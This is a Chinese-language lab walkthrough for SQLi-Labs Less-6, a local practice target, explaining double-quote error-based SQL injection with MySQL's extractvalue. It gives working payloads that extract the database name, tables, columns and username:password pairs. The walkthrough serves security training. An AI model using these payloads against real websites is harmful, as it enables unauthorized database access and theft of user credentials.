# SQLi-Labs Less-6 复现指南 🛠️

Less-6 是**双引号闭合的报错注入**，核心思路和 Less-5 一致，只是闭合符从单引号 `'` 变为双引号 `"`。

---

#### 1. 环境与注入点判断

1. 访问 Less-6：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-6/
    ```

2. 测试闭合方式：

输入 `?id=1"`，页面返回 MySQL 语法错误：

```Plain Text

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" " LIMIT 0,1' at line 1
```

这说明 SQL 语句为：

```SQL

SELECT * FROM users WHERE id="$id" LIMIT 0,1;
```

闭合方式为 `"`，后续用 `--+` 注释剩余内容。

---

#### 2. 报错注入原理（extractvalue 函数）

`extractvalue(xml_doc, xpath_expr)` 用于从 XML 中提取数据，当 `xpath_expr` 格式非法时，MySQL 会报错并暴露其中的内容，我们借此获取敏感数据。

---

#### 3. 分步构造 Payload

##### ① 获取当前数据库名

```Plain Text

?id=1" and extractvalue(1, concat(0x7e, (select database()), 0x7e))--+
```

- `0x7e` 是 `~` 的十六进制，用于分隔识别数据

- 页面报错会显示：`~security~`（当前数据库为 `security`）

##### ② 获取表名

```Plain Text

?id=1" and extractvalue(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1), 0x7e))--+
```

- 调整 `limit 0,1` 可依次获取 `emails`、`referers`、`uagents`、`users` 等表名

##### ③ 获取列名（以 users 表为例）

```Plain Text

?id=1" and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1), 0x7e))--+
```

- 调整 `limit` 可获取 `id`、`username`、`password` 等列名

##### ④ 获取用户名和密码（最终 Payload）

```Plain Text

?id=1" and extractvalue(1, concat(0x7e, (select concat(username, ':', password) from users limit 0,1), 0x7e))--+
```

- 执行后，页面报错会显示第一条用户数据，如 `~Dumb:Dumb~`

- 调整 `limit 0,1` 为 `limit 1,1`、`limit 2,1` 等，可依次获取其他用户信息

---

#### 4. 注意事项

- 确保 MySQL 版本 ≥ 5.1（支持 `extractvalue` 函数）

- 若页面无报错，可能是关闭了错误显示，需改用其他注入方式

- 注释符 `--+` 中的 `+` 是 URL 编码的空格，也可用 `%23`（`#`）替代
> （注：文档部分内容可能由 AI 生成）